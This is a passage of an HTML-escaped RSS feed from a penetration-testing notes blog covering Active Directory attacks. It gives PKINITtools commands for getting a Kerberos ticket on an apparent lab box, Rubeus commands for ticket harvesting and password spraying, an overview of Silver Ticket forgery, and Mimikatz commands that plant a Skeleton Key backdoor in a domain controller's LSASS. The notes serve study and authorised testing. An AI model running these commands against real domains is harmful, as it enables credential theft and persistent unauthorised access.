style=&#34;border-spacing:0;padding:0;margin:0;border:0;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;&#xA;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1&#xA;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&#xA;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;&#xA;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 /opt/PKINITtools/gettgtpkinit.py -cert-pfx vGRMeeb9.pfx certified.htb/management_svc -pfx-pass &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;25nQ6mg4JUTeQEjjNRE2&amp;#39;&lt;/span&gt; management_svc.ccache&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&#xA;&lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;This will create a Kerberos ticket called management_svc.ccache file, which we can export and use the key this output provides in conjunction with &lt;code&gt;getnthash.py&lt;/code&gt; from the same toolkit to get the NTLM hash of the management_svc user.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Rubeus</title>
      <link>https://kdbed.github.io/posts/rubeus/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/rubeus/</guid>
      <description>&lt;h2 id=&#34;rubeus&#34;&gt;Rubeus&lt;/h2&gt;&#xA;&lt;h3 id=&#34;harvesting-and-brute-forcing-tickets&#34;&gt;Harvesting and Brute-forcing tickets&lt;/h3&gt;&#xA;&lt;p&gt;Rubeus has a wide variety of attacks and features that allow it to be a very versatile tool for attacking Kerberos. Just some of the many tools and attacks include overpass the hash, ticket requests and renewals, ticket management, ticket extraction, harvesting, pass the ticket, AS-REP Roasting, and Kerberoasting.&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/GhostPack/Rubeus&#34;&gt;GhostPack&lt;/a&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Harvest TGTs every 30 seconds: &lt;code&gt;Rubeus.exe harvest /interval:30&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Password spray against found users and provide a &lt;code&gt;.kirbi&lt;/code&gt; TGT for that user: &lt;code&gt;Rubeus.exe brute /password:Password1 /noticket&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;</description>
    </item>
    <item>
      <title>Silver Ticket</title>
      <link>https://kdbed.github.io/posts/silver_ticket/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/silver_ticket/</guid>
      <description>&lt;h2 id=&#34;silver-ticket&#34;&gt;Silver Ticket&lt;/h2&gt;&#xA;&lt;p&gt;A Silver Ticket is a forged &lt;strong&gt;&lt;strong&gt;Kerberos Service Ticket (TGS)&lt;/strong&gt;&lt;/strong&gt; that allows access to a specific service without contacting a Domain Controller. It is created using the &lt;strong&gt;&lt;strong&gt;NTLM hash of the target service account&lt;/strong&gt;&lt;/strong&gt;, often a computer account (e.g., `HOST/`, `HTTP/`).&lt;/p&gt;&#xA;&lt;h3 id=&#34;overview&#34;&gt;Overview&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Forged TGS for a specific service&lt;/li&gt;&#xA;&lt;li&gt;Does not require communication with a Domain Controller&lt;/li&gt;&#xA;&lt;li&gt;Uses the &lt;strong&gt;&lt;strong&gt;service account&amp;rsquo;s NTLM hash&lt;/strong&gt;&lt;/strong&gt;, not KRBTGT&lt;/li&gt;&#xA;&lt;li&gt;Lower privilege, more stealthy than a Golden Ticket&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;prerequisites&#34;&gt;Prerequisites&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;SYSTEM or Administrator access on a domain-joined machine&lt;/li&gt;&#xA;&lt;li&gt;Knowledge of:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;NTLM hash of the target service account (e.g., machine account or managed service account)&lt;/li&gt;&#xA;&lt;li&gt;SPN (Service Principal Name)&lt;/li&gt;&#xA;&lt;li&gt;Domain name &amp;amp; FQDN&lt;/li&gt;&#xA;&lt;li&gt;Domain SID&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;key-concepts&#34;&gt;Key Concepts&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Service Ticket (TGS)&lt;/strong&gt;: Used to authenticate to a service (e.g., CIFS, MSSQL, HTTP)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;SPN&lt;/strong&gt;: Tied to the service account; uniquely identifies the Kerberos service&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Computer account NTLM hash&lt;/strong&gt; = used to sign TGS for that host&lt;/li&gt;&#xA;&lt;li&gt;Bypasses the KDC entirely; invisible to the Domain Controller&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;mimikatz-commands&#34;&gt;Mimikatz Commands&lt;/h3&gt;&#xA;&lt;h4 id=&#34;get-ntlm-hash-of-the-service-account&#34;&gt;Get NTLM Hash of the Service Account&lt;/h4&gt;&#xA;&lt;p&gt;Typically done via secretsdump.py, DCSync, or LSASS dump.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Skeleton Key</title>
      <link>https://kdbed.github.io/posts/pentest_active_directory_skeleton_key/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/pentest_active_directory_skeleton_key/</guid>
      <description>&lt;h2 id=&#34;skeleton-key&#34;&gt;Skeleton Key&lt;/h2&gt;&#xA;&lt;p&gt;A &lt;strong&gt;&lt;strong&gt;Skeleton Key&lt;/strong&gt;&lt;/strong&gt; is a stealthy backdoor attack where Mimikatz injects a patch into &lt;strong&gt;&lt;strong&gt;LSASS memory&lt;/strong&gt;&lt;/strong&gt; on a Domain Controller. This allows an attacker to &lt;strong&gt;&lt;strong&gt;authenticate as any domain user using a master password&lt;/strong&gt;&lt;/strong&gt;, in addition to their real credentials.&lt;/p&gt;&#xA;&lt;h3 id=&#34;overview&#34;&gt;Overview&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Injects code into `lsass.exe` on a Domain Controller&lt;/li&gt;&#xA;&lt;li&gt;Leaves legitimate logins untouched&lt;/li&gt;&#xA;&lt;li&gt;Adds a universal password valid for all domain accounts&lt;/li&gt;&#xA;&lt;li&gt;Memory-resident: disappears on reboot&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;prerequisites&#34;&gt;Prerequisites&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;SYSTEM-level access on a &lt;strong&gt;&lt;strong&gt;Domain Controller&lt;/strong&gt;&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Ability to execute code and patch LSASS memory&lt;/li&gt;&#xA;&lt;li&gt;Mimikatz or similar tool&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;key-concepts&#34;&gt;Key Concepts&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;LSASS&lt;/strong&gt;: Local Security Authority Subsystem Service; handles authentication&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patch&lt;/strong&gt;: Modifies Kerberos/NTLM authentication providers in memory&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Backdoor password&lt;/strong&gt;: An additional universal password accepted for all users&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;mimikatz-commands&#34;&gt;Mimikatz Commands&lt;/h3&gt;&#xA;&lt;h4 id=&#34;load-skeleton-key-patch&#34;&gt;Load Skeleton Key Patch&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mimikatz &lt;span style=&#34;color:#75715e&#34;&gt;# privilege::debug&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mimikatz &lt;span style=&#34;color:#75715e&#34;&gt;# misc::skeleton&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Default password: mimikatz&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
